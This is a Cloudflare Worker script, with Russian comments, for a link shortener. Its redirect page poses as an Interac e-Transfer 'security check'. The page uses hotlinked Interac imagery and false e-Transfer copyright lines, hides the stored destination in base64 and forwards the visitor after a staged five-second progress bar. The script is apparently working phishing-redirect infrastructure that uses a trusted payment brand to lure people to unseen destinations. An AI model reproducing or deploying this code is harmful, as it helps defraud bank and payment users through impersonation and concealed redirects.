addEventListener('fetch', (event) => {
  event.respondWith(handleRequest(event.request));
});

// BASE_URL определяется на основе заголовка Host
async function handleRequest(request) {
  const BASE_URL = new URL("/", `https://${request.headers.get("host") || "default.example.com"}`).origin;
  console.log(`Request received: ${request.method} ${request.url}`);

  if (request.method === 'POST') {
      return await shortenURL(request, BASE_URL);
  } else if (request.method === 'GET') {
      return await handleRedirect(request, BASE_URL);
  } else {
      return new Response('Method not allowed', { status: 405 });
  }
}

async function shortenURL(request, BASE_URL) {
  try {
      const { url } = await request.json();
      if (!url || !isValidURL(url)) {
          return new Response('Invalid URL', { status: 400 });
      }

      const id = generateID();
      await LINKS.put(id, url);
      const shortURL = `${BASE_URL}/${id}`;

      return new Response(JSON.stringify({ shortURL }), {
          headers: { 'Content-Type': 'application/json',
                     'X-Content-Type-Options': 'nosniff',
                     'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
                     'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;", 
                     'Referrer-Policy': 'no-referrer',
                     'Permissions-Policy': 'fullscreen=(), geolocation=()',
                     'X-Frame-Options': 'DENY',
                     'Cache-Control': 'no-store',
                     'Feature-Policy': "geolocation 'none'; microphone 'none'" }
      });
  } catch {
      return new Response('Error processing request', { status: 500 });
  }
}

async function handleRedirect(request, BASE_URL) {
  const url = new URL(request.url);
  const id = url.pathname.slice(1);

  if (!id) {
      return create404Page(BASE_URL);
  }

  const targetURL = await LINKS.get(id);
  if (targetURL) {
      return createRedirectPage(targetURL, BASE_URL);
  } else {
      return create404Page(BASE_URL);
  }
}

function generateID() {
  return Math.random().toString(36).substr(2, 8);
}

function isValidURL(string) {
  try {
      new URL(string);
      return true;
  } catch (_) {
      return false;
  }
}

// Страницы редиректа и 404 с безопасными заголовками
function createRedirectPage(targetURL) {
    const encodedURL = btoa(targetURL); // Кодируем URL в Base64
    const html = `
      <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security check</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-unique123'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;">
    <meta name="referrer" content="no-referrer">
    <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
    <meta name="author" content="Dino">
    <meta name="description" content="Secure URL shortening service">
    <style nonce="unique123">
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
        }

        img {
            max-width: 45%;
            height: auto;
        }

        .progress {
            margin-top: 20px;
            width: 70%;
            max-width: 350px;
            height: 20px;
            max-height: 20px;
            background-color: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 100%;
            background-color: #fcd116;
            transition: width 0.5s;
        }

        .redirect-message {
            margin-top: 18px;
            font-size: 22px;
        }

        .circle {
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background-color: #f0f0f0;
            border: 1px solid #ccc;
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>
    <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
    <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
    <div class="progress">
        <div class="progress-bar" id="progress-bar"></div>
    </div>
    <div class="redirect-message" id="redirect-message">Редирект</div>
    <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
    <p>Security check of the link. 🔒</p>

    <script nonce="unique123" type="text/javascript">
        const progressBar = document.getElementById('progress-bar');
        const redirectMessage = document.getElementById('redirect-message');
        let dots = '';
        let intervalId;

        // Функция для обновления сообщения с точками
        function updateRedirectMessage() {
            if (dots.length < 3) {
                dots += '.';
            } else {
                dots = ''; // Сброс точек после трех
            }
            redirectMessage.textContent = `Редирект${dots}`;
        }

        // Запускаем анимацию точек каждую секунду
        intervalId = setInterval(updateRedirectMessage, 1000);

        // Через 5 секунд останавливаем анимацию и выполняем редирект
        setTimeout(() => {
            clearInterval(intervalId); // Останавливаем анимацию точек
            const url = atob('${encodedURL}'); // Декодируем URL
            window.location.href = url; // Редирект на целевую страницу
        }, 5000); // 5000 миллисекунд = 5 секунд
    </script>
</body>
</html>
    `;
    return new Response(html, {
      headers: { 
        'Content-Type': 'text/html',
        'X-Content-Type-Options': 'nosniff',
        'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'nonce-unique123'; style-src 'self' 'nonce-unique123'; img-src 'self' https://www.interac.ca data:;", 
        'Referrer-Policy': 'no-referrer',
        'Permissions-Policy': 'fullscreen=(), geolocation=()',
        'X-Frame-Options': 'DENY',
        'Cache-Control': 'no-store',
        'Feature-Policy': "geolocation 'none'; microphone 'none'"
      }
    });
  }
  
  


function create404Page() {
  const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Secure URL shortening service</title>
          <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;">
          <meta name="referrer" content="no-referrer">
          <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
          <meta name="author" content="Dino">
          <meta name="description" content="Secure URL shortening service">
          <style>
              body {
                  font-family: Arial, sans-serif;
                  text-align: center;
                  padding: 50px;
              }
              h1 {
                  color: #ff0000;
              }
              footer {
                  margin-top: 50px;
                  font-size: 14px;
                  color: #555;
              }
          </style>
      </head>
      <body>
          <h1>Secure URL shortening service</h1>
          <p>The page you are looking for does not exist.</p>
          <footer>
              <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
          </footer>
      </body>
      </html>
  `;
  return new Response(html, {
      headers: { 'Content-Type': 'text/html',
                 'X-Content-Type-Options': 'nosniff',
                 'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
                 'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;", 
                 'Referrer-Policy': 'no-referrer',
                 'Permissions-Policy': 'fullscreen=(), geolocation=()',
                 'X-Frame-Options': 'DENY',
                 'Cache-Control': 'no-store' }
  });
}
